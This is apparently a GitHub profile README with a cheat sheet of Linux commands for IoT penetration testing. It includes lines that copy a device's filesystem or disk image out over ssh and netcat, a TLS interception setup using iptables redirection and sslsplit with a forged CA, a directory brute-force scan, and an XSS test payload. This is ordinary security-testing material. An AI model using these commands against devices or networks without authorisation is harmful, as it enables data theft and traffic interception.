- 👋 Hi, I’m @CertAndKey
- 👀 Here are some useful Linux commands for IoT pentesters

MOVE IoT FILESYSTEM TO PENTEST MACHINE  tar zcvf -  <FILESYSTEM_HERE> | ssh user@laptop "cat > /path/to/laptop/save.tgz"
ADD IPTABLES FORWARDING RULE            sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
SSLSPLIT SETUP                          sslsplit -D -X <OUTPUT_FILE_DESTINATION> -k ca.key -c ca.crt ssl 0.0.0.0 8080
COPY READY ONLY FILESYSTEM              dd if=/dev/sda | gzip -1 - | ssh user@local dd of=image.gz
ENABLE IPFORWARD                        sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
GOBUSTER                                gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt
CROSS-SITE SCRIPT TEST                  <script>alert('hello')</script>
VIEW OPENSSL CERT CONTENTS              openssl x509 -in ca.crt -text
PICOCOM                                 sudo picocom -b <baud> /dev/<device>     TO EXIT PICOCOM: CTRL+A then CTRL+x
MOVING FILES WITH NETCAT                nc -nvlp 9999 > /output/file/path         # on your machine
                                        nc ip.of.your.machine 9999 < /path/to/bin # on IoT device
RUN THE SAME COMMAND ON LOTS OF FILES   find * >> files.txt
                                        for files in $(cat files.txt);do <command> $files;done   #iterates through files.txt and runs command on each one
LOCATE PARTITIONS                       cat /proc/mtd
MONITOR PERIPHERAL DEVICE ACTIVITY      sudo dmesg -w
